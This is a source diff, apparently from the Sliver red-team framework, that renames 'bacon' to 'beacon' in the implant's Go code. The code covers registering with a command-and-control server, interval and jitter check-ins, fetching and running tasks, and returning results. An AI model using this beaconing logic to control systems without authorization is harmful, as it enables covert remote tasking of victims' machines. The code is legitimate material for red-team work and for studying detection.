@@ -33,7 +33,7 @@ import (
 	"runtime"
 	"time"
 
-	// {{if .Config.IsBacon}}
+	// {{if .Config.IsBeacon}}
 	"sync"
 
 	// {{end}}
@@ -87,8 +87,8 @@ func (serv *sliverService) Execute(args []string, r <-chan svc.ChangeRequest, ch
 	for {
 		select {
 		default:
-			// {{if .Config.IsBacon}}
-			baconStartup()
+			// {{if .Config.IsBeacon}}
+			beaconStartup()
 			// {{else}}
 			sessionStartup()
 			// {{end}}
@@ -177,32 +177,32 @@ func main() {
 	svc.Run("", &sliverService{})
 	// {{else}}
 
-	// {{if .Config.IsBacon}}
-	baconStartup()
-	// {{else}} ------- IsBacon/IsSession -------
+	// {{if .Config.IsBeacon}}
+	beaconStartup()
+	// {{else}} ------- IsBeacon/IsSession -------
 	sessionStartup()
 	// {{end}}
 
 	// {{end}} ------- IsService -------
 }
 
-// {{if .Config.IsBacon}}
+// {{if .Config.IsBeacon}}
 
-func baconStartup() {
+func beaconStartup() {
 	// {{if .Config.Debug}}
-	log.Printf("Running in Bacon mode with ID: %s", InstanceID)
+	log.Printf("Running in Beacon mode with ID: %s", InstanceID)
 	// {{end}}
 	abort := make(chan struct{})
 	defer func() {
 		abort <- struct{}{}
 	}()
-	bacons := transports.StartBaconLoop(abort)
-	for bacon := range bacons {
+	beacons := transports.StartBeaconLoop(abort)
+	for beacon := range beacons {
 		// {{if .Config.Debug}}
-		log.Printf("Next bacon = %v", bacon)
+		log.Printf("Next beacon = %v", beacon)
 		// {{end}}
-		if bacon != nil {
-			err := baconMainLoop(bacon)
+		if beacon != nil {
+			err := beaconMainLoop(beacon)
 			if err != nil {
 				connectionErrors++
 				if transports.GetMaxConnectionErrors() < connectionErrors {
@@ -253,29 +253,29 @@ func sessionStartup() {
 
 // {{end}}
 
-// {{if .Config.IsBacon}}
-func baconMainLoop(bacon *transports.Bacon) error {
-	// Register bacon
-	err := bacon.Init()
+// {{if .Config.IsBeacon}}
+func beaconMainLoop(beacon *transports.Beacon) error {
+	// Register beacon
+	err := beacon.Init()
 	if err != nil {
 		// {{if .Config.Debug}}
-		log.Printf("Bacon init error: %s", err)
+		log.Printf("Beacon init error: %s", err)
 		// {{end}}
 		return err
 	}
 	defer func() {
-		err := bacon.Cleanup()
+		err := beacon.Cleanup()
 		if err != nil {
 			// {{if .Config.Debug}}
-			log.Printf("[bacon] cleanup failure %s", err)
+			log.Printf("[beacon] cleanup failure %s", err)
 			// {{end}}
 		}
 	}()
 
-	err = bacon.Start()
+	err = beacon.Start()
 	if err != nil {
 		// {{if .Config.Debug}}
-		log.Printf("Error starting bacon: %s", err)
+		log.Printf("Error starting beacon: %s", err)
 		// {{end}}
 		connectionErrors++
 		if transports.GetMaxConnectionErrors() < connectionErrors {
@@ -285,40 +285,40 @@ func baconMainLoop(bacon *transports.Bacon) error {
 	}
 	connectionErrors = 0
 	// {{if .Config.Debug}}
-	log.Printf("Registering bacon with server")
+	log.Printf("Registering beacon with server")
 	// {{end}}
-	nextCheckin := time.Now().Add(bacon.Duration())
+	nextCheckin := time.Now().Add(beacon.Duration())
 	register := registerSliver()
-	register.ActiveC2 = bacon.ActiveC2
-	register.ProxyURL = bacon.ProxyURL
-	bacon.Send(wrapEnvelope(sliverpb.MsgBaconRegister, &sliverpb.BaconRegister{
+	register.ActiveC2 = beacon.ActiveC2
+	register.ProxyURL = beacon.ProxyURL
+	beacon.Send(wrapEnvelope(sliverpb.MsgBeaconRegister, &sliverpb.BeaconRegister{
 		ID:          InstanceID,
-		Interval:    bacon.Interval(),
-		Jitter:      bacon.Jitter(),
+		Interval:    beacon.Interval(),
+		Jitter:      beacon.Jitter(),
 		Register:    register,
-		NextCheckin: int64(bacon.Duration().Seconds()),
+		NextCheckin: int64(beacon.Duration().Seconds()),
 	}))
 	time.Sleep(time.Second)
-	bacon.Close()
+	beacon.Close()
 
-	// BaconMain - Is executed in it's own goroutine as the function will block
+	// BeaconMain - Is executed in it's own goroutine as the function will block
 	// until all tasks complete (in success or failure), if a task handler blocks
-	// forever it will simply block this set of tasks instead of the entire bacon
+	// forever it will simply block this set of tasks instead of the entire beacon
 	errors := make(chan error)
 	shortCircuit := make(chan struct{})
 	for {
-		duration := bacon.Duration()
+		duration := beacon.Duration()
 		nextCheckin = time.Now().Add(duration)
 		go func() {
-			oldInterval := bacon.Interval()
-			err := baconMain(bacon, nextCheckin)
+			oldInterval := beacon.Interval()
+			err := beaconMain(beacon, nextCheckin)
 			if err != nil {
 				// {{if .Config.Debug}}
-				log.Printf("[bacon] main error: %v", nextCheckin)
+				log.Printf("[beacon] main error: %v", nextCheckin)
 				// {{end}}
 				errors <- err
-			} else if oldInterval != bacon.Interval() {
-				// The bacon's interval was modified so we need to short circuit
+			} else if oldInterval != beacon.Interval() {
+				// The beacon's interval was modified so we need to short circuit
 				// the current sleep and tell the server when the next checkin will
 				// be based on the new interval.
 				shortCircuit <- struct{}{}
@@ -326,7 +326,7 @@ func baconMainLoop(bacon *transports.Bacon) error {
 		}()
 
 		// {{if .Config.Debug}}
-		log.Printf("[bacon] sleep until %v", nextCheckin)
+		log.Printf("[beacon] sleep until %v", nextCheckin)
 		// {{end}}
 		select {
 		case <-errors:
@@ -339,47 +339,47 @@ func baconMainLoop(bacon *transports.Bacon) error {
 	return nil
 }
 
-func baconMain(bacon *transports.Bacon, nextCheckin time.Time) error {
-	err := bacon.Start()
+func beaconMain(beacon *transports.Beacon, nextCheckin time.Time) error {
+	err := beacon.Start()
 	if err != nil {
 		// {{if .Config.Debug}}
-		log.Printf("[bacon] start failure %s", err)
+		log.Printf("[beacon] start failure %s", err)
 		// {{end}}
 		return err
 	}
 	defer func() {
 		// {{if .Config.Debug}}
-		log.Printf("[bacon] closing ...")
+		log.Printf("[beacon] closing ...")
 		// {{end}}
 		time.Sleep(time.Second)
-		bacon.Close()
+		beacon.Close()
 	}()
 	// {{if .Config.Debug}}
-	log.Printf("[bacon] sending check in ...")
+	log.Printf("[beacon] sending check in ...")
 	// {{end}}
-	err = bacon.Send(wrapEnvelope(sliverpb.MsgBaconTasks, &sliverpb.BaconTasks{
+	err = beacon.Send(wrapEnvelope(sliverpb.MsgBeaconTasks, &sliverpb.BeaconTasks{
 		ID:          InstanceID,
-		NextCheckin: int64(bacon.Duration().Seconds()),
+		NextCheckin: int64(beacon.Duration().Seconds()),
 	}))
 	if err != nil {
 		// {{if .Config.Debug}}
-		log.Printf("[bacon] send failure %s", err)
+		log.Printf("[beacon] send failure %s", err)
 		// {{end}}
 		return err
 	}
 	// {{if .Config.Debug}}
-	log.Printf("[bacon] recv task(s) ...")
+	log.Printf("[beacon] recv task(s) ...")
 	// {{end}}
-	envelope, err := bacon.Recv()
+	envelope, err := beacon.Recv()
 	if err != nil {
 		// {{if .Config.Debug}}
-		log.Printf("[bacon] recv failure %s", err)
+		log.Printf("[beacon] recv failure %s", err)
 		// {{end}}
 		return err
 	}
 	if envelope == nil {
 		// {{if .Config.Debug}}
-		log.Printf("[bacon] read nil envelope (no tasks)")
+		log.Printf("[beacon] read nil envelope (no tasks)")
 		// {{end}}
 		return nil
 	}
@@ -387,13 +387,13 @@ func baconMain(bacon *transports.Bacon, nextCheckin time.Time) error {
 	err = proto.Unmarshal(envelope.Data, tasks)
 	if err != nil {
 		// {{if .Config.Debug}}
-		log.Printf("[bacon] unmarshal failure %s", err)
+		log.Printf("[beacon] unmarshal failure %s", err)
 		// {{end}}
 		return err
 	}
 
 	// {{if .Config.Debug}}
-	log.Printf("[bacon] received %d task(s) from server", len(tasks.Tasks))
+	log.Printf("[beacon] received %d task(s) from server", len(tasks.Tasks))
 	// {{end}}
 	if len(tasks.Tasks) == 0 {
 		return nil
@@ -413,29 +413,29 @@ func baconMain(bacon *transports.Bacon, nextCheckin time.Time) error {
 
 	// ensure extensions are registered before they are called
 	var results []*sliverpb.Envelope
-	for _, r := range baconHandleTasklist(tasksExtensionRegister) {
+	for _, r := range beaconHandleTasklist(tasksExtensionRegister) {
 		results = append(results, r)
 	}
-	for _, r := range baconHandleTasklist(tasksOther) {
+	for _, r := range beaconHandleTasklist(tasksOther) {
 		results = append(results, r)
 	}
 
-	err = bacon.Send(wrapEnvelope(sliverpb.MsgBaconTasks, &sliverpb.BaconTasks{
+	err = beacon.Send(wrapEnvelope(sliverpb.MsgBeaconTasks, &sliverpb.BeaconTasks{
 		ID:    InstanceID,
 		Tasks: results,
 	}))
 	if err != nil {
 		// {{if .Config.Debug}}
-		log.Printf("[bacon] error sending results %s", err)
+		log.Printf("[beacon] error sending results %s", err)
 		// {{end}}
 	}
 	// {{if .Config.Debug}}
-	log.Printf("[bacon] all results sent to server, cleanup ...")
+	log.Printf("[beacon] all results sent to server, cleanup ...")
 	// {{end}}
 	return nil
 }
 
-func baconHandleTasklist(tasks []*sliverpb.Envelope) []*sliverpb.Envelope {
+func beaconHandleTasklist(tasks []*sliverpb.Envelope) []*sliverpb.Envelope {
 	results := []*sliverpb.Envelope{}
 	resultsMutex := &sync.Mutex{}
 	wg := &sync.WaitGroup{}
@@ -444,7 +444,7 @@ func baconHandleTasklist(tasks []*sliverpb.Envelope) []*sliverpb.Envelope {
 
 	for _, task := range tasks {
 		// {{if .Config.Debug}}
-		log.Printf("[bacon] execute task %d", task.Type)
+		log.Printf("[beacon] execute task %d", task.Type)
 		// {{end}}
 		if handler, ok := sysHandlers[task.Type]; ok {
 			wg.Add(1)
@@ -458,9 +458,9 @@ func baconHandleTasklist(tasks []*sliverpb.Envelope) []*sliverpb.Envelope {
 					defer resultsMutex.Unlock()
 					// {{if .Config.Debug}}
 					if err != nil {
-						log.Printf("[bacon] handler function returned an error: %s", err)
+						log.Printf("[beacon] handler function returned an error: %s", err)
 					}
-					log.Printf("[bacon] task completed (id: %d)", taskID)
+					log.Printf("[beacon] task completed (id: %d)", taskID)
 					// {{end}}
 					results = append(results, &sliverpb.Envelope{
 						ID:   taskID,
@@ -476,9 +476,9 @@ func baconHandleTasklist(tasks []*sliverpb.Envelope) []*sliverpb.Envelope {
 					defer resultsMutex.Unlock()
 					// {{if .Config.Debug}}
 					if err != nil {
-						log.Printf("[bacon] handler function returned an error: %s", err)
+						log.Printf("[beacon] handler function returned an error: %s", err)
 					}
-					log.Printf("[bacon] task completed (id: %d)", taskID)
+					log.Printf("[beacon] task completed (id: %d)", taskID)
 					// {{end}}
 					results = append(results, &sliverpb.Envelope{
 						ID:   taskID,
@@ -509,11 +509,11 @@ func baconHandleTasklist(tasks []*sliverpb.Envelope) []*sliverpb.Envelope {
 	}
 
 	// {{if .Config.Debug}}
-	log.Printf("[bacon] waiting for task(s) to complete ...")
+	log.Printf("[beacon] waiting for task(s) to complete ...")
 	// {{end}}
 	wg.Wait() // Wait for all tasks to complete
 	// {{if .Config.Debug}}
-	log.Printf("[bacon] all tasks completed, sending results to server")
+	log.Printf("[beacon] all tasks completed, sending results to server")
 	// {{end}}
 
 	return results
@@ -524,13 +524,13 @@ func openSessionHandler(data []byte) {
 	err := proto.Unmarshal(data, openSession)
 	if err != nil {
 		// {{if .Config.Debug}}
-		log.Printf("[bacon] failed to parse open session msg: %s", err)
+		log.Printf("[beacon] failed to parse open session msg: %s", err)
 		// {{end}}
 	}
 
 	if openSession.Delay != 0 {
 		// {{if .Config.Debug}}
-		log.Printf("[bacon] delay %s", time.Duration(openSession.Delay))
+		log.Printf("[beacon] delay %s", time.Duration(openSession.Delay))
 		// {{end}}
 		time.Sleep(time.Duration(openSession.Delay))
 	}
@@ -552,12 +552,12 @@ func openSessionHandler(data []byte) {
 					break
 				}
 				// {{if .Config.Debug}}
-				log.Printf("[bacon] failed to connect to server: %s", err)
+				log.Printf("[beacon] failed to connect to server: %s", err)
 				// {{end}}
 			}
 			if len(openSession.C2S) <= connectionAttempts {
 				// {{if .Config.Debug}}
-				log.Printf("[bacon] failed to connect to server, max connection attempts reached")
+				log.Printf("[beacon] failed to connect to server, max connection attempts reached")
 				// {{end}}
 				break
 			}
@@ -565,7 +565,7 @@ func openSessionHandler(data []byte) {
 	}()
 }
 
-// {{end}} -IsBacon
+// {{end}} -IsBeacon
 
 func sessionMainLoop(connection *transports.Connection) error {
 	if connection == nil {
